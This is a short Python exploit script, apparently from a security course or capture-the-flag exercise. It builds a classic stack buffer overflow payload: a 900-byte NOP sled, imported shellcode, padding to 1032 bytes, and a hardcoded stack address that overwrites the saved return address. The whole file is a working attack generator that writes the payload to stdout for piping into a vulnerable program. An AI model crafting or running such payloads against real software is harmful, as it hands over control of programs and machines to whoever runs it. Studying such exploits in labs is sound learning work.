#!/usr/bin/env python3

from shellcode import shellcode
import sys

buf_address = 0x7ffffff40d90

# Gonna put it near the middle of the NOP sled so that the offset still lands within the sled
target_address = buf_address + 300

# 900 bytes of NOPs
payload = b"\x90" * 900

#add Shellcode (54 bytes)
payload += shellcode

# Need to pad to reach the return address
# 900 (Sled) + 54 (Shell) = 954 byes so far
# Need 1032 total (buffer + 8 to return address)
padding = 1032 - len(payload)
payload += b"A" * padding

# Overwirte the return address with the NOP sled
payload += target_address.to_bytes(8, "little")

sys.stdout.buffer.write(payload)